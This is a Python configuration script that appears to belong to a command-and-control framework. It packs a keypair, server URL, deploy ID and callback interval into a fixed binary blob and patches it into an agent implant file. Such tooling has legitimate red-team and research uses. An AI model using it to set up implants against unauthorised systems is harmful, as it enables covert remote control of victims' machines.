"""
Agent configuration handling - 528 bytes total (128 bytes keypair + 400 bytes JSON)
"""
import json
import base64
import re
from typing import Dict, Any, Tuple
from crypto import generate_key_pair

CONFIG_SIZE = 528
KEYPAIR_SIZE = 128  # 64 bytes each for public and private keys
MAX_JSON_SIZE = 400

def create_config(server_url: str, deploy_id: str, callback_interval: int, c2_public_key: bytes) -> Tuple[bytes, bytes, bytes]:
    """Create agent configuration with embedded keypair and JSON"""
    # Generate agent keypair
    agent_public_key, agent_private_key = generate_key_pair()
    
    # Create configuration JSON
    config_data = {
        "server_url": server_url,
        "deploy_id": deploy_id,
        "callback_interval": callback_interval,
        "c2_public_key": c2_public_key.hex()
    }
    
    config_json = json.dumps(config_data).encode('utf-8')
    if len(config_json) > MAX_JSON_SIZE:
        raise ValueError(f"Configuration JSON too large: {len(config_json)} > {MAX_JSON_SIZE}")
    
    # Pad JSON to exactly MAX_JSON_SIZE bytes
    padded_json = config_json.ljust(MAX_JSON_SIZE, b'\x00')
    
    # Combine: 64 bytes public key + 64 bytes private key + 400 bytes JSON
    keypair_data = agent_public_key.ljust(64, b'\x00') + agent_private_key.ljust(64, b'\x00')
    
    config_binary = keypair_data + padded_json
    return config_binary, agent_public_key, agent_private_key

def save_test_config(test_file_path: str, server_url: str, deploy_id: str, callback_interval: int, 
                    c2_public_key: bytes, c2_private_key: bytes, agent_public_key: bytes, agent_private_key: bytes) -> None:
    """Save all configuration keys and values to JSON file for testing"""
    test_config = {
        "server_url": server_url,
        "deploy_id": deploy_id,
        "callback_interval": callback_interval,
        "keys": {
            "c2_public_key": c2_public_key.hex(),
            "c2_private_key": c2_private_key.hex(),
            "agent_public_key": agent_public_key.hex(),
            "agent_private_key": agent_private_key.hex()
        },
        "config_info": {
            "config_size_bytes": CONFIG_SIZE,
            "keypair_size_bytes": KEYPAIR_SIZE,
            "max_json_size_bytes": MAX_JSON_SIZE,
            "agent_public_key_size": len(agent_public_key),
            "agent_private_key_size": len(agent_private_key),
            "c2_public_key_size": len(c2_public_key),
            "c2_private_key_size": len(c2_private_key)
        }
    }
    
    with open(test_file_path, 'w', encoding='utf-8') as f:
        json.dump(test_config, f, indent=2)
    
    print(f"Test configuration saved to: {test_file_path}")

def configure_agent_file(agent_file_path: str, server_url: str, deploy_id: str, callback_interval: int, 
                        c2_public_key: bytes, c2_private_key: bytes = None, save_test_json: str = None) -> None:
    """Configure agent by replacing CONFIG_B64 string in the agent.py file"""
    # Create configuration data
    config_data, agent_public_key, agent_private_key = create_config(server_url, deploy_id, callback_interval, c2_public_key)
    
    # Base64 encode the configuration
    config_b64 = base64.b64encode(config_data).decode('ascii')
    
    # Read the agent file
    with open(agent_file_path, 'r', encoding='utf-8') as f:
        agent_code = f.read()
    
    # Find and replace the CONFIG_B64 string
    config_pattern = r'CONFIG_B64 = "([A-Za-z0-9+/=]*)"'
    
    if not re.search(config_pattern, agent_code):
        raise ValueError("CONFIG_B64 string not found in agent file")
    
    # Replace the configuration
    new_agent_code = re.sub(
        config_pattern,
        f'CONFIG_B64 = "{config_b64}"',
        agent_code
    )
    
    # Write the configured agent file
    with open(agent_file_path, 'w', encoding='utf-8') as f:
        f.write(new_agent_code)
    
    # Save test configuration if requested
    if save_test_json and c2_private_key:
        save_test_config(save_test_json, server_url, deploy_id, callback_interval, 
                        c2_public_key, c2_private_key, agent_public_key, agent_private_key)
    
    print(f"Agent configured successfully: {agent_file_path}")
    print(f"Deploy ID: {deploy_id}")
    print(f"Server URL: {server_url}")
    print(f"Callback interval: {callback_interval}s")

def load_config(config_data: bytes) -> Tuple[bytes, bytes, Dict[str, Any]]:
    """Load and parse agent configuration"""
    if len(config_data) != CONFIG_SIZE:
        raise ValueError(f"Invalid configuration size: {len(config_data)} != {CONFIG_SIZE}")
    
    # Extract keypair (first 128 bytes)
    agent_public_key = config_data[:64].rstrip(b'\x00')
    agent_private_key = config_data[64:128].rstrip(b'\x00')
    
    # Extract and parse JSON (remaining 400 bytes)
    json_data = config_data[128:].rstrip(b'\x00')
    config_dict = json.loads(json_data.decode('utf-8'))
    
    # Convert c2_public_key back from hex
    config_dict['c2_public_key'] = bytes.fromhex(config_dict['c2_public_key'])
    
    return agent_public_key, agent_private_key, config_dict

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 5:
        print("Usage:")
        print("  python configure.py <agent_file> <server_url> <deploy_id> <callback_interval> [c2_public_key_hex] [--test-json output.json]")
        print("  python configure.py <agent_file> <server_url> <deploy_id> <callback_interval> --generate-keys [--test-json output.json]")
        print()
        print("Examples:")
        print("  python configure.py agent.py http://localhost:8080 agent001 30 deadbeef...")
        print("  python configure.py agent.py http://localhost:8080 agent001 30 --generate-keys --test-json test_config.json")
        sys.exit(1)
    
    agent_file = sys.argv[1]
    server_url = sys.argv[2]
    deploy_id = sys.argv[3]
    callback_interval = int(sys.argv[4])
    
    # Check for options
    generate_keys = '--generate-keys' in sys.argv
    test_json_file = None
    
    if '--test-json' in sys.argv:
        test_json_index = sys.argv.index('--test-json')
        if test_json_index + 1 < len(sys.argv):
            test_json_file = sys.argv[test_json_index + 1]
        else:
            print("Error: --test-json requires a filename")
            sys.exit(1)
    
    try:
        if generate_keys:
            # Generate C2 keypair
            c2_public_key, c2_private_key = generate_key_pair()
            print(f"Generated C2 public key: {c2_public_key.hex()}")
            print(f"Generated C2 private key: {c2_private_key.hex()}")
        else:
            # Use provided C2 public key
            if len(sys.argv) < 6 or sys.argv[5].startswith('--'):
                print("Error: C2 public key required when not using --generate-keys")
                sys.exit(1)
            c2_public_key = bytes.fromhex(sys.argv[5])
            c2_private_key = None
        
        configure_agent_file(agent_file, server_url, deploy_id, callback_interval, 
                           c2_public_key, c2_private_key, test_json_file)
        
    except Exception as e:
        print(f"Configuration failed: {e}")
        sys.exit(1)